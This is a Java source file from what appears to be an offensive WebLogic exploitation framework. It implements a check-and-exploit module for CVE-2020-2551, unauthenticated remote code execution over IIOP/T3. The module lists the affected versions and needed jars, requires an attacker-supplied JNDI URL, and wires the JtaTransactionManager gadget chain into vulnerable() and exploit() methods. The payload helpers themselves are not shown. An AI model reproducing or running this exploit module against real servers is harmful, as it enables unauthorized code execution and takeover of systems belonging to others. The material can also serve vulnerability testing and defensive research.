/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.vuls.impl;

import com.r4v3zn.weblogic.framework.annotation.Authors;
import com.r4v3zn.weblogic.framework.annotation.Dependencies;
import com.r4v3zn.weblogic.framework.annotation.Versions;
import com.r4v3zn.weblogic.framework.utils.PayloadUtils;
import com.r4v3zn.weblogic.framework.utils.VulUtils;
import com.r4v3zn.weblogic.framework.entity.MyException;
import com.r4v3zn.weblogic.framework.gadget.impl.JtaTransactionManagerGadget;
import com.r4v3zn.weblogic.framework.entity.VulCheckParam;
import com.r4v3zn.weblogic.framework.vuls.VulTest;

import javax.naming.Context;

import static com.r4v3zn.weblogic.framework.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CVE-2020-2551
 * Desc:
 * <p>
 *     攻击者可以通过 T3、IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器 权限并在未授权情况下远程执行任意代码。
 *     漏洞影响版本:
 *     Oracle WebLogic Server 10.3.6.0.0
 *     Oracle WebLogic Server 12.1.3.0.0
 *     Oracle WebLogic Server 12.2.1.3.0
 *     Oracle WebLogic Server 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2551
 *     paper: https://www.r4v3zn.com/posts/b64d9185/
 * </p>
 * Date:2020/3/23 23:05
 * Email:woo0nise@gmail.com
 * @version 1.1.0
 */
@Authors({Authors.R4V3ZN,Authors.LUFEI})
@Dependencies({":JtaTransactionManager"})
@Versions({"10.3.6.0", "12.1.3.0", "12.2.1.0", "12.2.1.2.0", "12.2.1.3.0", "12.2.1.4.0"})
public class CVE_2020_2551 implements VulTest {

    /**
     * 漏洞利用 jar 文件名称
     */
    public static final String[] VUL_DEPENDENCIES = new String[]{"com.bea.core.repackaged.springframework.spring.jar", "com.bea.core.repackaged.apache.commons.logging.jar"};

    /**
     * 漏洞影响版本
     */
    private static final String[] VUL_VERSIONS = new String[]{"10.3.6.0", "10.3.6.0.0", "12.1.3.0", "12.2.1.0", "12.2.1.0.0", "12.2.1.2.0", "12.2.1.2.0.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};

    /**
     * current context
     */
    private Context currentContext = null;

    /**
     * remote
     */
    private Object remote = null;

    public static final String STATIC_BIND_NAME = "testInfo";

    /**
     * bind name
     */
    private String bindName = STATIC_BIND_NAME;

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url url
     * @param vulCheckParam 漏洞校验额外参数
     * @return 漏洞存在返回 true 否则返回 false
     * @throws Exception 抛出异常
     */
    public Boolean vulnerable(String url, VulCheckParam vulCheckParam) throws Exception{
        String version = vulCheckParam.getVersion();
        String[] versionArr = version.split("\\.");
        if(Integer.parseInt(versionArr[0]) <= 10 || (Integer.parseInt(versionArr[0]) == 12 && Integer.parseInt(versionArr[1]) == 1)){
            version = "10.3.6.0";
        }else if(vulCheckParam.getVersion().contains("12.2.1.3") || vulCheckParam.getVersion().contains("12.2.1.4")){
            version = "12.2.1.3.0";
        }
        vulCheckParam.setVersion(version);
        if(isBlank(vulCheckParam.getJndiUrl())){
            throw new MyException("JNDI URL 不能为空");
        };
        return PayloadUtils.baseVulnerable(url, JtaTransactionManagerGadget.class, this, vulCheckParam);
    }

    /**
     * 漏洞校验
     * @param url url
     * @param param 执行参数
     * @return
     * @throws Exception
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
        return VulUtils.exploit(url, remote, param);
    }
}
